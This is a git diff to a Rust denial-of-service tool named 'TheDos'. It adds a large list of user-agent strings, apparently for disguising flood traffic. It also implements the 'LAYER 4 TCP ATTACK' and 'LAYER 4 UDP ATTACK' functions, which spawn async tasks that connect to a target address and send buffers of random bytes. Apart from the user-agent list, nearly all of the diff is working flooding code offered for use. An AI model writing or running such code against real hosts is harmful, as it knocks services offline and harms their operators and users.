@@ -95,6 +95,8 @@ impl TheDos{
 
     pub fn build_user_agents(&self) -> Vec<&'static str>{ // use 'static lifetime in order to be able to return &str from the function since rust doesn't allow to return reference by default unless the return type has a valid and defined lifetime
         let mut user_agents = Vec::<&str>::new();
+        user_agents.push("Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393");
+        user_agents.push("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51");
         user_agents.push("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
         user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
         user_agents.push("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
@@ -106,8 +108,37 @@ impl TheDos{
         user_agents.push("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)");
         user_agents.push("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)");
         user_agents.push("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)");
-        user_agents.push("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51");
-        
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169");
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120");
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ");
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0");
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582");
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577");
+        user_agents.push("Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6");
+        user_agents.push("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200");
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586");
+        user_agents.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+        user_agents.push("Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
+
         user_agents
     
     }
@@ -195,56 +226,76 @@ impl TheDos{
                 process::exit(1); // reached the maximum workers
             }
 
-        } 
+        }
         
     
     }
     
 
     
-    ////////////////////////////////////////////////////////////////////////////
-    //////////////////////////////// TCP ATTACK ////////////////////////////////
-    ////////////////////////////////////////////////////////////////////////////
+    ////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////// LAYER 4 TCP ATTACK ////////////////////////////////
+    ////////////////////////////////////////////////////////////////////////////////////
     
     pub async fn tcpcall(&mut self){
 
         let mut time = self.retries;
-    
-        loop{
+        let workers = self.n_workers; // making a new lifetime for the workers
+        let tcp_addr = self.tcp_addr.clone().unwrap(); // if we are here we are sure that we have a tcp address from the passed in cli arg
 
-            time+=1;
-            let tcp_addr = self.tcp_addr.clone().unwrap();
-            tokio::spawn(async move{ 
-                match TcpStream::connect(tcp_addr.as_str()).await{
-                    Ok(mut stream) => {
-    
-                        println!("sending packet at {} | retries {}", chrono::Local::now(), time);
-                        let random_bytes: Vec<u8> = (0..1024).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with size 1024 bytes
-                        stream.write_all(&random_bytes).await.unwrap(); // sending buffer to the target host 
-    
-                    },
-                    Err(e) => {
-                        eprintln!(": {} at {}", e, chrono::Local::now());
-                    }
+        time+=1;
+        tokio::spawn(async move{ // we can't use self inside the tokio::spawn() body since self is a reference that is only valid in the associated function body
+            match TcpStream::connect(tcp_addr.clone().as_str()).await{
+                Ok(mut stream) => {
+
+                    println!("sending packet at {} | retries {}", chrono::Local::now(), time);
+                    let random_bytes: Vec<u8> = (0..workers).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of workers as the byte size, for 4096 workers we'll have 4096 bytes
+                    stream.write_all(&random_bytes).await.unwrap(); // sending buffer to the target host 
+
+                },
+                Err(e) => {
+                    eprintln!(": {} at {}", e, chrono::Local::now());
                 }
-            });  
-
-            self.retries = time;
-        }
+            }
+        });  
+        
+        self.retries = time;
     
     }
     
 
     
-    ////////////////////////////////////////////////////////////////////////////
-    //////////////////////////////// UDP ATTACK ////////////////////////////////
-    ////////////////////////////////////////////////////////////////////////////
+    ////////////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////// LAYER 4 UDP ATTACK ////////////////////////////////
+    ////////////////////////////////////////////////////////////////////////////////////
+    // since the UDP protocol doesn't have any capabilities to detect a broken connection 
+    // the server needs to be run first, otherwise the client will block forever.
     
     pub async fn udpcall(&mut self){
-        
-        loop{
-            // flooding udp attack 
-        }
+            
+        let mut time = self.retries;
+        let workers = self.n_workers; // making a new lifetime for the workers
+        let udp_addr = self.udp_addr.clone().unwrap(); // if we are here we are sure that we have a udp address from the passed in cli arg
+           
+        time+=1;
+        tokio::spawn(async move{
+            let socket = UdpSocket::bind("0.0.0.0:0").await.unwrap(); // binding to any available address and any port selected by the os 
+            match socket.connect(udp_addr.clone().as_str()).await{
+                Ok(_) => {
+
+                    println!("sending packet at {} | retries {}", chrono::Local::now(), time);
+                    let random_bytes: Vec<u8> = (0..workers).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of workers as the byte size, for 4096 workers we'll have 4096 bytes
+                    socket.send(&random_bytes).await.unwrap(); // send to the remote address that this socket is connected to or we can send to another address 
+
+                },
+                Err(e) => {
+                    eprintln!(": {} at {}", e, chrono::Local::now());
+                }
+
+            }
+        });
+             
+        self.retries = time;
 
     }
 
